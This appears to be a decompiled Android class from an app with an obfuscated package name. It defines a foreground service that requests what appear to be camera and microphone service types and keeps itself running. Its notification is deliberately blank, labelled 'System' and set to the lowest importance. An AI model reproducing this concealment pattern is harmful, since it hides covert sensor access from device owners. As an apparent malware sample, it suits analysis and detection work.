package com.servers.ozzbzk;

import android.R;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;

/* loaded from: classes.dex */
public class BridgeService extends Service {
    private static final String CHANNEL_ID = "bridge_service";
    private static final int NOTIFICATION_ID = 1;

    @Override // android.app.Service
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override // android.app.Service
    public int onStartCommand(Intent intent, int i, int i2) {
        return NOTIFICATION_ID;
    }

    @Override // android.app.Service
    public void onCreate() {
        super.onCreate();
        createChannel();
        Notification buildNotification = buildNotification();
        if (Build.VERSION.SDK_INT >= 34) {
            startForeground(NOTIFICATION_ID, buildNotification, 1073742016);
        } else {
            startForeground(NOTIFICATION_ID, buildNotification);
        }
    }

    private void createChannel() {
        if (Build.VERSION.SDK_INT < 26) {
            return;
        }
        NotificationChannel notificationChannel = new NotificationChannel(CHANNEL_ID, "System", 0);
        notificationChannel.setShowBadge(false);
        notificationChannel.setSound(null, null);
        if (Build.VERSION.SDK_INT >= 29) {
            notificationChannel.setImportance(0);
        }
        NotificationManager notificationManager = (NotificationManager) getSystemService(NotificationManager.class);
        if (notificationManager != null) {
            notificationManager.createNotificationChannel(notificationChannel);
        }
    }

    private Notification buildNotification() {
        Notification.Builder builder;
        if (Build.VERSION.SDK_INT >= 26) {
            builder = new Notification.Builder(this, CHANNEL_ID);
        } else {
            builder = new Notification.Builder(this);
        }
        return builder.setContentTitle("").setContentText("").setSmallIcon(R.drawable.ic_menu_info_details).setOngoing(true).setPriority(-2).build();
    }
}
